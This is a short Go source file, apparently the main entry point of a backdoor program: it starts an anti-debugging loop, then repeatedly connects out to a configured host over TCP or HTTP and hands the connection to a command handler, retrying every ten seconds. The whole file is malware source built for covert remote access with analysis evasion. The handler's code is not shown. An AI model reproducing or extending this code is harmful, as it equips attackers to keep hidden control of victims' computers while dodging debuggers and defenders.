package main

import (
	"backdoor/config"
	"backdoor/evasion"
	"backdoor/handler"
	"backdoor/transport"
	"time"
)

func main() {
	evasion.StartAntiDebugLoop()
	for {
		var conn transport.Transport
		var err error

		switch config.Mode {
		case "tcp":
			conn = transport.NewTCP(config.Host + ":" + config.Port)
		case "udp":
			//conn = transport.NewUDP(config.Host + ":" +config.Port)
		case "http":
			conn = transport.NewHTTP("http://" + config.Host + ":" + config.Port)
		}

		if conn == nil {
			time.Sleep(10 * time.Second)
			continue
		}
		if err = conn.Connect(); err != nil {
			return
		}

		handler.Handle(conn)
		conn.Close()
		time.Sleep(10 * time.Second)
	}
}
